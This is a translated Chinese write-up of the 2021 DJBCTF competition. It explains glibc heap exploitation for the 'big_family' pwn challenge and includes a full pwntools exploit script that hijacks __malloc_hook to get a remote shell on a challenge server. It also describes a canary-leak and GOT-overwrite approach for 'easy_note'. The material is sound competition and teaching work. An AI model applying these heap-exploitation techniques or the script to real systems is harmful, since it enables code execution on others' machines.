# 2021 DJBCTF Writeup
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
个人赛，最后总排名第三，AK了PWN和RE，Web挖到了一处rce，Misc把签到题做了一下。
## PWN
###  big_family
程序存在 **off by null** 漏洞，但是对申请的size有限制，申请范围在0x10~0x46之间，所以对于利用方式也有所限制。
申请这个范围，意味着size位在0x21-0x51之间，刚开始做的时候没想到能申请到0x51的size，故一直没想到办法，通过这个博客学习到了一种之前没有实战过（但想到过）的利用思路：。通过劫持main_arena上的top来申请到想要的位置，但是在这之前，我们先需要通过合理的布局来构成
**chunk overlapping** 。
**如何来构成chunk overlapping？**
**先来让unsorted bin中有堆块**
利用 **off by one** 的前提一般都是需要有unsorted
bin中的堆块，但是由于这道题申请size的限制，所以我们申请的堆块都会在fastbin中，这时候就需要一些其他操作来让其进入到unsorted bin中。
我们需要利用 **scanf** 来让fastbins中的chunk进入到unsorted bin中。也就是利用 **scanf**
接收时会调用malloc进行申请堆块，而当我们输入的长度大于0x400（largebin的范围），在申请的时候就会先去执行
**malloc_consolidate** ，在这个函数内会调用 **clear_fastchunks** 来清空fastbin，并且
**根据size从小到大依次** 让fastbin chunk进入到unsorted
bin中，并且判定是否可以合并，如果有相邻的fastbin则发生合并。而在之后遍历unsorted bin的时候，又会先从unsorted
bin中脱链根据大小来进入到small bin或者largebin，如果大小不合适的话，就会存在于这两者其中的一个。
**所以在通常情况下，执行scanf的表象就是fastbin中的元素都进入到smallbin中去了。**
**注意：在触发malloc_consolidate后，进入unsorted bin的fastbin的下一个堆块的prev_inuse =
0，并且被写入了prev_size信息。**
**如何利用？**
由于这次加入了 **scanf** 来作为构造的限制，所以一般的 **off by one**
的方法都不再适用了。这次我们需要的就是我之前就在博客中所提及的 **堆收缩（poison_null_byte）** 的方法。之前用的情况是在无法控制
**prev_size**
的时候，而这次是在于如果某个堆块的size在0x101，那么这个堆块一定是在free状况下的，因为我们最多只能申请0x51的size，这样的话我们就无法控制再次free这个堆块来触发unlink。
所以利用 **poison_null_byte**
的方法从而来让堆块收缩，这样的话，由于写prev_inuse和prev_size都是根据当前堆块的size来计算下个堆块的位置来写的，在收缩之后，由于计算得出的下个堆块的位置错误，
**当我们再次申请那部分（被收缩）的堆块的时候，prev_inuse和prev_size无法写入正确的位置。**
接下来我们只要让下面位置的堆块（通过 **malloc_consolidate** 从而标记过prev_inuse = 0的堆块）进入到unsorted
bin，由于prev_inuse = 0，系统根据prev_size去找前面的堆块去合并，从而触发unlink。
**leak libc**
有了chunk overlapping之后，稍微构造一下，就能通过unsorted bin在未free的堆块上写一个main_arena +
88，然后用自带的show函数就可以leak了。
**劫持main_arena**
又有了libc之后，我们可以考虑修改0x51size的chunk的fd到main_arena上的fastbinsY那块区域，我们可以构造，让
**fastbinY** 上有内容，且当这个内容的
**开头为0x56的时候（利用开启PIE后的随机性，有1/3的概率，至于为什么是这个数，可以看一下我house of storm里面写的分析）**
，那么我们就可以成功劫持到这块区域，其实这里可以利用的指定size的fastbinsY的限制挺多的。
比如说这道题（结合调试来看）：
**max限制**
1.我们选择的size至少要小于0x51，因为我们最多只能申请0x51，如果劫持0x51的话，在第二次申请的时候，fastbinsY中0x51size的内容开头就会变成0x7F，不符要求
2.其次我们必须要小于0x41，因为0x41的内容和0x51是相邻的，而我们又需要错位来绕过size判定，而他又是与0x51相邻的话，那么size那部分会有0x51size的内容。
所以综合以上两点，我们能够选择的只有0x21和0x31的size用于劫持，这里选择的是0x21的size，他的位置在 **main_arena +
0xD** 。
**min限制**
3.长度的限制，如果选择使用劫持较小的size，比如选用0x21的size就要考虑到这个问题，也就是能否修改到main_arnea ->
top的内容，有较大的可能性（如果申请size的时候要求小于0x3B + 8 = 0x43就修改不到了）
由于这些东西都是在调试中发现的问题，再去改前面申请的size（毕竟在做题的时候不会想这么全面），所以刚开始的时候没有发现这个问题，浪费了很长时间，而且在看ex师傅在那道题目的exp的时候也看不懂为什么size要变来变去的，直到自己亲手调试了才会明白，建议各位师傅可以亲手试试，下次做题的时候就会流畅很多了。
**修改main_arena -> top**
劫持之后我们就可以尝试修改main_arena -> top的内容了。
通过调试找到main_arena的位置，如果你劫持的是main_arnea +
0xD的0x18的size的fastbinY[0]，那么就要相隔0x3B个数据再写劫持的位置。
**确定劫持top的位置**
由于在malloc的时候会检测top
chunk的size位是否足够，如果不足够则会重新申请一块区域，所以我们一定要确保选择劫持的top位置，有足够大的size。
比如，如果我们要劫持 **free_hook的话，那么我们可以考虑** free_hook –
0xb58位置，但实际上这个位置距离__free_hook太远了，在这道题显然不适用。
所以这道题劫持的是 **malloc_hook，并且选择** malloc_hook –
0x28的这个位置，这个位置的size信息也恰好足够大，符合申请调用。
接下来只需要几次申请（先把fastbinsY和unsorted bin中的内容都申请完），就可以从top
chunk中进行申请，然后我们就可以申请到malloc_hook的位置。
不过这道题，直接上one_gadget无法打通，需要用一个小技巧，也就是用 **realloc_hook** 来调栈，大概也可以用触发double
free的方法吧（未测试）。
**最后稍微吐槽一下，这个libc版本好像不是很大众的吧，居然不给libc。**
**EXP**
    from pwn import *
    from LibcSearcher import *
    libc = ELF('/home/wjh/LibcSearcher/libc-database/db/hitcon-libc-2.23.so')
    context.log_level = "debug"
    def choice(idx):
        r.sendlineafter("Choice:", str(idx))
    def add(size, content = '\n'):
        choice(1)
        r.sendlineafter("build?", str(size))
        r.sendlineafter("house?", content)
    def delete(idx):
        choice(2)
        r.sendlineafter("remove?", str(idx))
    def show(idx):
        choice(3)
        r.sendlineafter("view?", str(idx))
    def pie(addr=0):
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(r.pid)).readlines()[1], 16)
        return text_base + addr
    def pwn():
        add(0x28)  # 0
        add(0x40)  # 1
        add(0x40)  # 2
        add(0x40)  # 3
        add(0x40)  # 4
        add(0x40)  # 5
        add(0x18)  # 6
        delete(0)
        delete(1)
        delete(2)
        delete(3)
        delete(4)
        choice('5' * 0x400)
        add(0x28, 'a' * 0x28)  # 0
        add(0x38)  # 1
        add(0x38)  # 2
        add(0x40)  # 3
        add(0x28)  # 4
        delete(1)
        delete(5)
        choice('5' * 0x400)
        add(0x38)  # 1
        show(2)
        main_arena_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 88
        malloc_hook_addr = main_arena_addr - 0x10
        #libc = LibcSearcher('__malloc_hook', malloc_hook_addr)
        #libc_base = malloc_hook_addr - libc.dump('__malloc_hook')
        libc_base = malloc_hook_addr - libc.sym['__malloc_hook']
        realloc_addr = libc_base + libc.sym['realloc']
        #realloc_addr = libc_base + libc.dump('realloc')
        one = [0x45216, 0x4526a, 0xf0274, 0xf1117]
        one_gadget = libc_base + one[3]
        delete(3)
        add(0x28)  # 3
        add(0x18, p64(0) + p64(0x51) + p64(main_arena_addr + 0xD))  # 7
        #heap = pie(0x202060)
        #log.success("heap: " + hex(heap))
        log.success("main_arena_addr: " + hex(main_arena_addr))
        add(0x40)
        delete(0)
        add(0x43, '\x00' * 0x3b + p64(malloc_hook_addr - 0x28))
        add(0x40) #8
        add(0x40) #9
        add(0x40) #10
        add(0x40, p64(0) * 2 + p64(one_gadget) + p64(realloc_addr + 0x6)) #11
        log.success("one_gadget: " + hex(one_gadget))
        #gdb.attach(r, "b *" + hex(one_gadget))
        choice(1)
        r.sendlineafter("build?", str(0x20))
        r.interactive()
    while True:
        try:
            #r = process('./family')
            r = remote('111.231.70.44', 28003)
            pwn()
        except EOFError:
            pass
###  easy_note
libc2.27，没开pie保护且是Partial RELRO
**题目信息**
这道题和一般的堆题不太一样，他是用mmap申请了一个大堆，然后之后写堆块内容都是从他的那块上来，不过也不彻底，还是有一个malloc用于储存临时的结构数据。
他的这个堆块的结构大概是这样的：
offset | name  
---|---  
0x0 | size  
0x8 | canary(4 bytes)  
0x10 | content_ptr  
程序开了另外一个线程，用于检测他自己随机的 **canary** 是否被更改。
**利用方法**
并且程序存在可以自己输入size的功能，这就造成了溢出，但是由于他这个 **canary** 的保护，直接修改 **content_ptr** 是不可行的。
接下来我们就要把注意力转移到如何泄露出canary的方向上，在show函数中，程序根据这里的size去输出content_ptr的内容，而我们通过堆溢出又正好可以修改这个size的信息，那么我们就可以把size改大，然后泄露canary的内容，在下次溢出的时候保证canary不变的同时来修改content_ptr来实现任意读写。
由于程序没有开 **FULL RELRO**
，所以我们这里可以考虑把content_ptr修改成got表上的free函数，从而show一次就可以leak出libc了。
刚开始的时候考虑修改 **__malloc_hook**
为one_gadget来传参，结果意料之外的是居然没有一个one_gadget可以成功getshell，甚至在利用realloc来调栈的方法都没有一个可行，所以只能考虑更为考虑的
**system** 函数。